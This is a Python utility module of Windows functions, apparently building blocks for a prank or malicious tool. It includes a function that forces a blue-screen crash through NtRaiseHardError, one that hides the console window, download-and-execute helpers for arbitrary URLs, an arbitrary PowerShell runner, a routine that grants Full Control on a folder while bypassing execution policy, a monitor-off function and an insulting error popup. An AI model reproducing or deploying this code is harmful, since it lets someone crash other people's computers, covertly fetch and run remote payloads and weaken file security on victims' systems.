import os
from pathlib import Path
import subprocess
import ctypes
import tkinter as tk
from tkinter import messagebox
from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref
import urllib.request
import zipfile
import shutil

def getDesktopPath():
    home = Path(os.environ['USERPROFILE'])
    documents_path = home / 'Desktop'
    return str(documents_path)



def getDocumentsPath():
    home = Path(os.environ['USERPROFILE'])
    documents_path = home / 'Documents'
    return str(documents_path)



def getOwnerShip(path):
    powershell_executable = "powershell.exe"
    folder_path = path

    
    powershell_script = fr'''
    $folderPath = "{folder_path}"
    $folderSecurity = Get-Acl -Path $folderPath
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Usuarios", "FullControl", "ContainerInherit, ObjectInherit", "None", "Allow")
    $folderSecurity.AddAccessRule($rule)
    Set-Acl -Path $folderPath -AclObject $folderSecurity
    '''

    
    result = subprocess.run([powershell_executable, "-ExecutionPolicy", "Bypass", "-Command", powershell_script], capture_output=True, text=True)
    print(result.stdout)
        

def StopMonitor(): # THIS IS VERY BAD, DO NOT USE IT IF YOU ARE NOT SURE.
    # Definir constantes
    HWND_BROADCAST = 0xFFFF
    WM_SYSCOMMAND = 0x0112
    SC_MONITORPOWER = 0xF170
    MONITOR_OFF = 2
    MONITOR_ON = -1

    # Obtener el manejador de la ventana activa
    hWnd = ctypes.windll.user32.GetForegroundWindow()

    # Apagar pantalla
    ctypes.windll.user32.PostMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, MONITOR_OFF)


def ShowFuckNotification(title, message):
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror(title, message)

def MakeBSOD():
    nullptr = POINTER(c_int)()

    windll.ntdll.RtlAdjustPrivilege(
        c_uint(19), 
        c_uint(1), 
        c_uint(0), 
        byref(c_int())
    )

    windll.ntdll.NtRaiseHardError(
        c_ulong(0xC000007B), 
        c_ulong(0), 
        nullptr, 
        nullptr, 
        c_uint(6), 
        byref(c_uint())
    )

def HideConsole():
    kernel32 = ctypes.WinDLL('kernel32')
    user32 = ctypes.WinDLL('user32')
    hWnd = kernel32.GetConsoleWindow()
    user32.ShowWindow(hWnd, 0)


def DownloadFile(url):
    downloads_folder = os.path.join(os.path.expanduser('~'), 'Downloads')
    file_name = url.split('/')[-1]
    file_path = os.path.join(downloads_folder, file_name)
    urllib.request.urlretrieve(url, file_path)
    return file_path

def StartProcess(file_path):
    os.startfile(file_path)

def PowerShellRun(cmd):
    completed = subprocess.run(["powershell", "-Command", cmd], capture_output=True)
    return completed


def ExtractZip(file_path, destination_path):
    with zipfile.ZipFile(file_path, 'r') as zip_ref:
        zip_ref.extractall(destination_path)

    return destination_path


def MoveFile(source_path, destination_path):
    try:
        shutil.move(source_path, destination_path)
    except shutil.Error as e:
        if "already exists" in str(e):
            try:
                shutil.copy2(source_path, destination_path)
                shutil.rmtree(source_path)
            except Exception as copy_error:
                print("ERR, could not rewrite the file:", copy_error)
        else:
            print("ERR, could not move the file:", e)
    except Exception as general_error:
        print("Error general:", general_error)
